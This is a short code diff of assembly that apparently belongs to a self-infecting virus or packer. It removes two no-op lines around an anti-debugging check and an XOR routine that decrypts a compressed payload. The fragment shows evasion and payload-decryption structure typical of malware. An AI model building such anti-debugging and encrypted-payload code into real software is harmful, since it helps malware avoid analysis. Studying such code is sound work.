@@ -92,7 +92,6 @@ can_run_infection:
 	cmp rax, 1					; if (_ret == !)
 	je .process					; 	goto .process;
 .TMP_END_anti_debugging:
-nop
 
 .TMP_uncipher:
 	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
@@ -104,7 +103,6 @@ nop
 	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 .TMP_END_uncipher:
-nop
 
 	.valid:
 		mov rax, 1					; return 1;
